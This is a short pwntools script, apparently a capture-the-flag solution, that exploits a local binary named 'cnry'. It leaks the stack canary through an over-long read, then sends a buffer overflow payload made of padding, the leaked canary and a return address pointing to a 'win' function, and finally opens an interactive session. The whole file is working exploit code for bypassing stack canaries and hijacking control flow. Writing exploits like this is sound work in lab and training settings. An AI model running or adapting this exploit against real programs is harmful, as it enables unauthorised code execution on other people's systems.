from pwn import *

p = process('./cnry')

win = 0x4011b6
buf = b"A"*0x49

p.sendafter(b"Leak: ", buf)
p.recvuntil(buf)

cnry = u64(b'\x00' + p.recv(7))
print(hex(cnry))

payload = b"A"*0x48 + p64(cnry) + b"B"*8 + p64(win)
p.sendafter(b"Exploit: ", payload)

p.interactive()